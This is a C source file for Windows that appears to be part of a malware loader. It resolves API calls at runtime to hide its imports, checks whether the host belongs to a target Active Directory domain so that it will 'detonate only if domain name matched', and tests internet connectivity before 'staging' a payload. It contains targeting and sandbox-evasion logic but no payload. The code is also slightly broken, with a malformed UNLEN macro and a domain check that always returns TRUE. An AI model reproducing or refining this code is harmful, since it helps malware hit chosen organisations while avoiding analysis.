// Check Domain Name before Spawning

#include "headers.h"
#include <Wininet.h>

#pragma comment (lib, "wininet.lib")

#define UNLEN 256;

typedef BOOL(WINAPI* _GetComputerNameExA)(
    COMPUTER_NAME_FORMAT NameType,
    LPSTR                lpBuffer,
    LPDWORD              nSize
    );


typedef BOOL(WINAPI* _InternetGetConnectedState)(
    LPDWORD  lpdwFlags,
    DWORD    dwReserved);


DWORD DomainCheck(){

    // To Get AD Domain Name
    COMPUTER_NAME_FORMAT name = ComputerNamePhysicalDnsDomain;

    HMODULE Kernel32 = GetModuleHandleA("Kernel32.dll");
   
    _GetComputerNameExA GetComputerNameExA = (_GetComputerNameExA)GetProcAddress(Kernel32, "GetComputerNameExA");
    if (GetComputerNameExA == NULL) {
        return -1;
    }

    // Init some important variables
    LPSTR lpBuffer[MAX_PATH];
    DWORD dwLength = UNLEN + 1;
    ZeroMemory(lpBuffer, MAX_PATH);

    // Retrieve name
    BOOL valid = GetComputerNameExA(name, (LPSTR)lpBuffer, &dwLength);
    
    if (!valid) {
        printf("Failed to Get Domain Name\n");
    }

   // printf("Domain is: %s\n", (LPSTR)lpBuffer);

    char domnam[256] = "radiantcorp.local";

    if (strcmp(domnam, (LPSTR)lpBuffer) == 0) {
        // detonate only if domain name matched
        printf("\nmatch\n");

        return TRUE;
    }

    // Change this to FALSE to check agains the domain above
    return TRUE;
}


// Check internet connectivity before staging
BOOL checkinternet() {

    HMODULE Wininet = LoadLibraryA("Wininet.dll");

    _InternetGetConnectedState ConnectStatus = (_InternetGetConnectedState)GetProcAddress(Wininet, "InternetGetConnectedState");

    int sleepBetweenQueriesInMS = 10000;
    LPDWORD connectionDescription=0;
    int isActive = 0;
    isActive = ConnectStatus(connectionDescription, 0);

    if (isActive == 0) {

        printf("No active connection, sleeping now for %d seconds\n", (sleepBetweenQueriesInMS / 1000));

        // wait 10 seconds and try again !
        Sleep(sleepBetweenQueriesInMS);
    }

    isActive = ConnectStatus(connectionDescription, 0);
    if (isActive == 0) {

        printf("I waited but no internet \n");
       // printf("Break");
}else{

   // printf("Internet check pass\n");
   // printf("Move to staging\n");

    return TRUE;
    }

 // dont wanna get those windns headers :(

    return FALSE;
}
